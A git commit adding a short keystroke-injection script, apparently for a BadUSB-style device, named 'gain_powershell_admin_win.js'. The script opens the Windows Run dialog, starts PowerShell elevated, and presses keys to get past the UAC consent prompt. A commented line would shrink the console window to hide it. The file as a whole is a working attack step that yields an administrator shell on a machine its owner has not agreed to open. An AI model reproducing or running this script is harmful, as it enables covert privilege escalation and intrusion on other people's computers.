4e66ba5bba735c697f8fec636000a1c039f723f7
kajt0sz <46679775+kaytosh@users.noreply.github.com>
2020-09-20 18:28:21 +0200

    Add files via upload

---
+++ gain_powershell_admin_win.js
@@ -0,0 +1,13 @@
+layout("us");
+typingSpeed(0,0)
+
+delay(500);
+press("GUI r");
+type("powershell.exe");
+delay(100);
+press("CTRL SHIFT ENTER");
+delay(500);
+press("SHIFT TAB");
+press("ENTER");
+//change window size to very small:
+//type("mode con:cols=15 lines=1\n");
